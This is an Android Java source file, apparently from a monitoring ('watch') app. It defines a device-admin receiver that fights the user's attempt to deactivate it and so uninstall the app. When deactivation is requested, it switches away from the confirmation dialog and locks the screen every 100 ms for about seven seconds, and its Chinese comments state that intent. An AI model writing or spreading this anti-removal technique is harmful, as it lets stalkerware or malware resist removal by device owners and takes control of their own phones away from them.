package example.fussen.watch.reciver;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.Context;
import android.content.Intent;

/**
 * Created by Fussen on 2016/11/3.
 */

public class UninstallReciver extends DeviceAdminReceiver {

    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        //跳离当前询问是否取消激活的 dialog
        Intent outOfDialog = context.getPackageManager().getLaunchIntentForPackage("com.android.settings");
        outOfDialog.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(outOfDialog);

        //调用设备管理器本身的功能，每 100ms 锁屏一次，用户即便解锁也会立即被锁，直至 7s 后
        final DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        dpm.lockNow();
        new Thread(new Runnable() {
            @Override
            public void run() {
                int i = 0;
                while (i < 70) {
                    dpm.lockNow();
                    try {
                        Thread.sleep(100);
                        i++;
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        }).start();

        return "";
    }
}
